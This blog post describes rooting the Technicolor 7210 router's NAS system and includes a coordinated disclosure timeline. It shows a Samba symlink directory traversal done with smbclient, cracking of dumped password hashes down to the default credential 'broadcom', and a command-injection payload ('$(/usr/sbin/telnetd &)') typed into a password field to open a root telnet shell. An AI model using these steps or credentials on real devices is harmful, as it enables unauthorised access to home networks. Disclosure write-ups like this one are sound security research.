+++
banner = "/uploads/2018/06/technicolor-got-root.png"
categories = [ "Exploit", "Linux", "Hardware Hacking", "Reverse Engineering" ]
date = "2018-06-03T11:20:00+00:00"
excerpt = "In this article, I will explain how to partially gained root access in a Technicolor 7210..."
format = "post"
tags = [ "Technicolor", "Passwords", "SOHO" ]
title = "Rooting the Technicolor 7210"

[[timeline]]
id = "disclosure"
title = "Disclosure Timeline"

[[disclosure]]
id = "F"
title = "30 days"
start = "2016-12-02"
end = "2017-01-02"
type = "background"
className = "bg-first text-dark"

[[disclosure]]
id = "S"
title = "60 days"
start = "2017-01-02"
end = "2017-02-02"
type = "background"
className = "bg-second text-dark"

[[disclosure]]
id = "T"
title = "90 days"
start = "2017-02-02"
end = "2017-03-02"
type = "background"
className = "bg-third text-dark"

[[disclosure]]
id = 1
title = "First reported issues to Ziggo"
start = "2016-12-02"

[[disclosure]]
id = 2
title = "Asked for an update"
start = "2016-12-09"

[[disclosure]]
id = 3
title = "Ziggo confirmed issues"
content = "Received reply confirming the bugs, and that the first and third bug were already fixed in next modem firmware. I confirmed the dates for coordinated disclosure, and agreed to test the beta of the new firmware"
start = "2016-12-12"

[[disclosure]]
id = 4
title = "Beta firmware ready"
content = "Received information that the beta firmware was ready"
start = "2016-12-16"

[[disclosure]]
id = 5
title = "Firmware malfunction"
content = "Installed the beta firmware but the modem malfunctioned"
start = "2016-12-17"

[[disclosure]]
id = 6
title = "Malfunction fixed"
content = "The malfunction was fixed and I was able to confirm that the third bug (RCE) had been fixed while the two first bugs hadn't."
start = "2016-12-19"

[[disclosure]]
id = 7
title = "Asked for an update"
start = "2017-01-17"

[[disclosure]]
id = 8
title = "Received update"
content = "Received update \"(...) issues are logged by Technicolor and will be further investigated and will be resolved in the final release. (...) A broad indication  will be Q1 2017. As soon as we have news we come back to you, you hear nothing remember us please\""
start = "2017-02-01"

[[disclosure]]
id = 9
title = "Requested firmware to be reverted"
content = "Requested the router to be reverted to the latest stable version"
start = "2017-02-07"

[[disclosure]]
id = 10
title = "Firmware was reverted"
content = "Modem reverted back to the original firmware"
start = "2017-02-08"

[[disclosure]]
id = 11
title = "Asked for an update"
content = "Asked for an update on  and explained that the details were going to be released as more than six months had passed, got no reply"
start = "2017-08-08"

[[disclosure]]
id = 12
title = "Public release"
content = "Released details through this blog post"
start = "2018-06-03"

[[disclosure]]
id = 13
title = "Technicolor reached out"
content = "Technicolor contacted me requesting further assurance that the bugs had been properly fixed and to contact them as well for future bugs I might find."
start = "2018-06-04"

[[disclosure]]
id = 14
title = "Ziggo reached out"
content = "Ziggo contacted me requesting further assurance that the bugs had been properly fixed and apologized for not responding"
start = "2018-06-04"
+++

The Technicolor 7210 home router is a powerful little device. It provides 1Gbps Ethernet, dual-band wireless for speeds ranging from 300Mbps to 1300Mbps, and Network Attached Storage (NAS) for file sharing and media streaming.

<!--more-->

{{< alert >}}I was able to confirm that two of the bugs (path transversal and remote code execution) highlighted in this blog post have been fixed by Technicolor. The other bug (weak credentials) I'm unable to validate as it depends on the remote code execution. Disclosure timeline can be found at the end of the blog post.{{< /alert >}}

### The Basic Principle

To get `root` in any network appliance, the first step is to get remote code execution (RCE). Getting RCE isn't the same as getting `root` access, but it does happen, since there is a tendency in network appliances to run everything in the context of the `root` user.

If that isn't the case and the commands executed are under the context of an unprivileged user, the next step after obtaining RCE is to find a way to escalate privileges. Usually that can be done by leveraging badly configured permissions, kernel exploits, etc.

{{< html >}}
<div class="row">
  <div class="col-md-7 col-sm-6">
    <p>One of the first place to start looking for RCE, is in the diagnostic functionalities of the appliance. Network appliances usually offer (at least) <code>ping</code> based diagnostic functionality. In the case of the TC7210, it offers <code>ping</code> and <code>ftp</code>. As such, that was where I focused my initial efforts.</p>
    <p>After checking both diagnostic pages and failing miserably, I decided to go back to basics by looking for known vulnerabilities in the software stack of the router.</p>
  </div>
  <div class="col-md-5 col-sm-6">
  {{< figure image="/uploads/2018/06/tc7210-ping-functionality.png" alternative="Ping diagnostic page" caption="The router ping diagnostic page." thumbnail="/uploads/2018/06/tc7210-ping-functionality-300x175.png" >}}
  </div>
</div>
{{< /html >}}

### What To Try Next

Scanning the router IP address didn't yield interesting results but on the other hand, scanning the IP address attributed to the NAS functionality proved to be a lot more interesting.

```shell {linenos=inline}
#!/bin/bash
nmap -sS -T4 192.168.100.206 -PN -sV
# Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-03 09:48 CEST
# Nmap scan report for 192.168.100.206
# Host is up (0.029s latency).
# Not shown: 996 closed ports
# PORT    STATE SERVICE     VERSION
# 21/tcp  open  ftp         BusyBox ftpd (D-Link DCS-932L IP-Cam camera)
# 80/tcp  open  http        BusyBox httpd 1.13
# 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
# 445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
# MAC Address: 08:95:2A:80:24:67 (Technicolor CH USA)
# Service Info: OS: Linux; Device: webcam; CPE: cpe:/h:dlink:dcs-932l, cpe:/o:linux:linux_kernel
#
# Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done: 1 IP address (1 host up) scanned in 12.96 seconds
```

Samba is a software that provides file and printer sharing using SMB/CIFS protocol. It has become a very important component to integrate Linux/Unix based systems into Windows based environments. Samba has had its fair share of vulnerabilities, so I decided to investigate it further.

```shell {linenos=inline}
#!/bin/bash
nmap -p 445 192.168.100.206 --script smb-os-discovery
# Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-03 09:53 CEST
# Nmap scan report for 192.168.100.206
# Host is up (0.0031s latency).
#
# PORT    STATE SERVICE
# 445/tcp open  microsoft-ds
# MAC Address: 08:95:2A:80:24:67 (Technicolor CH USA)
#
# Host script results:
# | smb-os-discovery:
# |   OS: Unix (Samba 3.0.37)
# |   NetBIOS computer name:
# |   Workgroup: WORKGROUP\x00
# |_  System time: 2018-06-03T08:41:51+00:00
#
# Nmap done: 1 IP address (1 host up) scanned in 0.49 seconds
```

It was possible to discover that the router uses Samba in its version 3.0.37. This version is vulnerable to [CVE-2010-0926][1]. This vulnerability happens because the default configuration of `smbd`, allows a remote authenticated user to leverage directory traversals to access arbitrary files. To do that the user only needs to create a symbolic link (i.e. shortcut) on a writable share.

### Exploiting The Flaw

After connecting a USB drive in the router and configuring a file share called `test`, I connected using the `smbclient` utility and by using its `symlink` command to create a symbolic link to the root directory I was able to confirm that the NAS Samba installation is indeed vulnerable.

```shell {linenos=inline}
#!/bin/bash
smbclient \\\\192.168.100.10\\test -N
# Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.37]
# Server not using user level security and no password supplied.
# smb: \> symlink ../../../ root
# smb: \> ls
#   .                                   D        0  Sun Oct 30 10:45:18 2016
#   ..                                  D        0  Sun Oct 30 10:44:13 2016
#   lost+found                          D        0  Sun Oct 30 10:29:58 2016
#   root                                D        0  Wed Mar  4 06:43:12 2015
#
#                 7782036 blocks of size 1024. 7369340 blocks available
# smb: \> cd root\
# smb: \root\> ls
#   .                                   D        0  Wed Mar  4 06:43:12 2015
#   ..                                  D        0  Wed Mar  4 06:43:12 2015
#   CVS                                 D        0  Wed Mar  4 06:29:42 2015
#   bin                                 D        0  Wed Mar  4 06:43:12 2015
#   dev                                 D        0  Wed Mar  4 06:43:18 2015
#   etc                                 D        0  Wed Mar  4 06:43:12 2015
#   lib                                 D        0  Wed Mar  4 06:43:12 2015
#   mnt                                 D        0  Thu Jan  1 01:00:30 1970
#   tmp                                 D        0  Sun Oct 30 10:44:15 2016
#   sys                                 D        0  Thu Jan  1 01:00:00 1970
#   var                                 D        0  Sun Oct 30 08:52:58 2016
#   usr                                 D        0  Wed Mar  4 06:37:30 2015
#   data                                D        0  Wed Mar  4 06:43:11 2015
#   init                                A   526180  Wed Mar  4 06:43:12 2015
#   proc                               DR        0  Thu Jan  1 01:00:00 1970
#   sbin                                D        0  Wed Mar  4 06:42:03 2015
#   linuxrc                             A   526180  Wed Mar  4 06:43:12 2015
#
#                 7782036 blocks of size 1024. 7369340 blocks available
```

I proceeded to download the entire file system. One thing that I noticed, was that the file system didn't contain any file related with the router web management interface (e.g. images, web pages, etc.) I assumed that was related with the fact that the user context in which the `smbd` daemon was running didn't have the permission to access those files.

### Weak Credentials

Not lingering too much on that, I decided to investigate what credentials I could find on the file system dump. As can be seen bellow, it was quite easy to crack the passwords found, they are quite simple and reused across all user accounts.

```shell {linenos=inline}
#!/bin/bash
cat etc/passwd
# root:OgKnQyJxrFabg:0:0:root:/:/bin/sh
# admin:pM3SFcK2.v1rk:0:0:Administrator:/:/bin/false
# support:DhsvlEFjJIDO2:0:0:Technical Support:/:/bin/false
# user:el3H9xuqK1naE:0:0:Normal User:/:/bin/false
# nobody:28nxEPGl5Ifik:1:0:nobody for ftp:/:/bin/false

wc -l passwords.txt
# 38633349 passwords.txt

john --wordlist=passwords.txt etc/passwd
# Loaded 5 password hashes with 5 different salts (Traditional DES [128/128 BS AVX-16])
# broadcom         (nobody)
# broadcom         (admin)
# broadcom         (root)
# broadcom         (support)
# broadcom         (user)
# guesses: 5  time: 0:00:00:03 DONE (Sun Oct 30 12:01:38 2016)  c/s: 13902K  trying: BRITGIRL - brokosz
# Use the "--show" option to display all of the cracked passwords reliably

cat etc/group
# root::0:root,admin,support,user

cat etc/samba/smbpasswd
# admin:0:F0D412BD764FFE81AAD3B435B51404EE:209C6174DA490CAEB422F3FA5A7AE634:[U          ]:LCT-5815A6F4:

john --wordlist=passwords.txt --format=nt etc/samba/smbpasswd
# Loaded 1 password hash (NT MD4 [128/128 X2 SSE2-16])
# admin            (admin)
# guesses: 1  time: 0:00:00:00 DONE (Sun Oct 30 12:15:04 2016)  c/s: 9581K  trying: Admiller0 - !@#admin
# Use the "--show" option to display all of the cracked passwords reliably
```

The next step was to focus on the binaries present on the file system. The following binaries seemed interesting (i.e. not Busybox related): `mscapp`, `smbapp`, `setappsver`, `remoteapi`, `rpc_test_client` and `rpc_test_server`.

### The Holly Grail

From all the strings dumped from these binaries, the string `(echo %s; echo %s) |/bin/smbpasswd -as admin` stood out. Taking into account the name of the application that contained it, `smbapp`, it was clear that this binary is the one that is used to manage the NAS file sharing functionality.

Breaking down the commands in that string we have:

* At least the first `%s` must be replaced by a password.
* This password is then echoed to the output.
* That output is then piped to the `smbpasswd` command.
* The `smbpasswd` comand changes the Samba `admin` user password with the one supplied.

If no filtering is involved, replacing `%s` with a user supplied password (very high probability of this happening) makes this functionality vulnerable to command injection by using the `$(<insert command to run>)` vector. To test if this was true, I navigated to the web page that allows a user to change the Samba administrator user password and submitted in both password fields the `$(/usr/sbin/telnetd &)` string.

{{< figure image="/uploads/2018/06/tc7210-smb-passwd-functionality.png" alternative="Changing administrator password" caption="Changing the file share administrator password." >}}

After submiting the form, I was able to confirm that the functionality is indeed vulnerable to RCE as the connection using a Telnet client was successful and the credentials found before (i.e. user `root` and password `broadcom`) were valid.

```shell {linenos=inline}
#!/bin/bash
telnet 192.168.100.10
# Trying 192.168.100.10...
# Connected to 192.168.100.10.
# Escape character is '^]'.
# (none) login: root
# Password:
#
#
# BusyBox v1.19.3 (2015-03-04 13:37:03 CST) built-in shell (ash)
# Enter 'help' for a list of built-in commands.
#
# ~ #
```

### Conclusions

Rummaging through the file system once again, I was unable to find any files related with the router management web interface (very strange since now I was connected with the `root` user).

After searching the Internet for answers, I found out that the TC7210 is a dual Operative System (OS) network appliance. For the network functionality, it uses the eCos real-time OS, and for the NAS functionality, it uses an embedded Linux based OS. I was able to get `root` access on the latter.

```shell {linenos=inline}
#!/bin/bash
uname -a
# Linux (none) 2.6.30-1.0.10mp3 #1 SMP Wed Mar 4 13:36:40 CST 2015 mips GNU/Linux

cat /proc/cpuinfo
# system type             : BCM3384 Cable Modem
# processor               : 0
# cpu model               : Broadcom BMIPS5000 V1.1  FPU V0.1
# BogoMIPS                : 667.64
# wait instruction        : no
# microsecond timers      : yes
# tlb_entries             : 64
# extra interrupt vector  : yes
# hardware watchpoint     : no
# ASEs implemented        :
# shadow register sets    : 1
# core                    : 0
# VCED exceptions         : not available
# VCEI exceptions         : not available
#
# processor               : 1
# cpu model               : Broadcom BMIPS5000 V1.1  FPU V0.1
# BogoMIPS                : 502.78
# wait instruction        : no
# microsecond timers      : yes
# tlb_entries             : 64
# extra interrupt vector  : yes
# hardware watchpoint     : no
# ASEs implemented        :
# shadow register sets    : 1
# core                    : 0
# VCED exceptions         : not available
# VCEI exceptions         : not available

cat /proc/meminfo
# MemTotal:         124304 kB
# MemFree:           94916 kB
# Buffers:             304 kB
# Cached:             6232 kB
# SwapCached:            0 kB
# Active:            16596 kB
# Inactive:           2584 kB
# Active(anon):      12916 kB
# Inactive(anon):        0 kB
# Active(file):       3680 kB
# Inactive(file):     2584 kB
# HighTotal:             0 kB
# HighFree:              0 kB
# LowTotal:         124304 kB
# LowFree:           94916 kB
# SwapTotal:             0 kB
# SwapFree:              0 kB
# Dirty:                 0 kB
# Writeback:             0 kB
# AnonPages:         12664 kB
# Mapped:             4056 kB
# Slab:               7764 kB
# SReclaimable:       2860 kB
# SUnreclaim:         4904 kB
# PageTables:          248 kB
# NFS_Unstable:          0 kB
# Bounce:                0 kB
# WritebackTmp:          0 kB
# CommitLimit:       62152 kB
# Committed_AS:      16136 kB
# VmallocTotal:    1015800 kB
# VmallocUsed:        1484 kB
# VmallocChunk:    1013560 kB

ifconfig -a
# eth0      Link encap:Ethernet  HWaddr 08:95:2A:80:24:67
#           inet addr:192.168.178.10  Bcast:192.168.178.255  Mask:255.255.255.0
#           inet6 addr: fe80::a95:2aff:fe80:2467/64 Scope:Link
#           UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
#           RX packets:4542 errors:0 dropped:0 overruns:0 frame:0
#           TX packets:4869 errors:0 dropped:0 overruns:0 carrier:0
#           collisions:0 txqueuelen:1000
#           RX bytes:387893 (378.8 KiB)  TX bytes:838039 (818.3 KiB)
#
# ifb0      Link encap:Ethernet  HWaddr 62:38:09:11:E8:0A
#           BROADCAST NOARP  MTU:1500  Metric:1
#           RX packets:0 errors:0 dropped:0 overruns:0 frame:0
#           TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
#           collisions:0 txqueuelen:32
#           RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
#
# ifb1      Link encap:Ethernet  HWaddr 2A:1B:73:B3:FF:12
#           BROADCAST NOARP  MTU:1500  Metric:1
#           RX packets:0 errors:0 dropped:0 overruns:0 frame:0
#           TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
#           collisions:0 txqueuelen:32
#           RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
#
# lo        Link encap:Local Loopback
#           inet addr:127.0.0.1  Mask:255.0.0.0
#           inet6 addr: ::1/128 Scope:Host
#           UP LOOPBACK RUNNING  MTU:16436  Metric:1
#           RX packets:3 errors:0 dropped:0 overruns:0 frame:0
#           TX packets:3 errors:0 dropped:0 overruns:0 carrier:0
#           collisions:0 txqueuelen:0
#           RX bytes:114 (114.0 B)  TX bytes:114 (114.0 B)
#
# sit0      Link encap:IPv6-in-IPv4
#           NOARP  MTU:1480  Metric:1
#           RX packets:0 errors:0 dropped:0 overruns:0 frame:0
#           TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
#           collisions:0 txqueuelen:0
#           RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
```

I was quite suprised at the specifications of the NAS part of the router. With the CPU it boasts amount of available memory and storage, there is the possibility to run some more software on it (e.g. VPN, Torrent, etc.) If one is wiling to [cross-compile][2] them.

Hope this has been interesting and insightful!

[1]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0926 "CVE-2010-0926"
[2]: https://github.com/tch-opensrc/ "Technicolor open source repository for TC7210/TC7230 models"
